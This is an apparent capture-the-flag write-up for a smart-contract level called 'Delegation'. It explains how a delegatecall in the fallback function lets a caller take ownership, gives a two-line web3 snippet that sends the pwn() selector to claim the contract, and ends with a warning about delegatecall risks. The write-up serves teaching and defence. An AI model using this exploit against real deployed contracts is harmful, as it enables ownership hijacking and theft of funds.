# Delegation

## Challenge statement

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

    Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
    Fallback methods
    Method ids


## Analysis

The contract contains a delegatecall, transferring access of the contract's state, allowing the other contract to modify the owner variable.

## Solution

Force the fallback function, provide data in the form of the pwn() function to transfer ownership.

```
var pwn = web3.utils.sha3("pwn()")
contract.sendTransaction({from: player, to: contract.address, data: pwn})
```

## Moral

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.

